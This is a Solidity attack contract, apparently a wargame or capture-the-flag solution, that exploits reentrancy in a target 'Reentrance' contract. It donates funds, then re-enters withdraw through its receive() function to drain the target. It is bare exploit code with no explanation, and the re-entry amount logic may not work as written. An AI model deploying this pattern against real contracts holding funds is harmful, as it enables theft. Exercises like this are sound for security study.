// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256);

    function withdraw(uint256 _amount) external;
}

contract Reentrancy {
    IReentrance public reentrance;

    uint8 public limit;
    uint8 public count;

    constructor(address _reentranceAddress) {
        reentrance = IReentrance(_reentranceAddress);
        limit = 2;
        count = 0;
    }

    function donate() external payable {
        reentrance.donate{value: msg.value}(address(this));
    }

    function attack() external payable {
        if (count < limit) {
            count++;
            reentrance.withdraw(msg.value);
        }
    }

    receive() external payable {
        this.attack();
    }
}
